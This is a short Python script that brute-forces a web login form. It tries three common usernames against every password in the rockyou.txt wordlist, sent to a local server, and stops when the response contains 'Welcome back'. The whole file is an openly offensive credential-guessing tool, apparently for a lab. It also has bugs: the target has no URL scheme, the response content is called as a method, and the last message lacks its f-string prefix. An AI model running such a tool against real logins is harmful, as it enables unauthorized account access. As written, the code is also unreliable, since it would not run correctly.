import requests
import sys
import os

# Get the absolute path of the file
file_path = os.path.abspath("/usr/share/wordlists/rockyou.txt")
target="127.0.0.1:5000"
usernames=['admin', 'user', 'test']
needle="Welcome back" # needle is the message that we will search about it in the response

for username in usernames:
    with open(file_path, 'r') as password_list:
        for password in password_list:
            password=password.strip('\n').encode()
            sys.stdout.write(f"[X] Attemping user: {username} => password: {password.decode()} \r")
            sys.stdout.flush()
            r=requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content():
                sys.stdout.write("\n")
                sys.stdout.write(f"\t Valid password '{password}' for user '{username}' !")
                sys.exit()
    sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.write("no password found for '{username}'")


    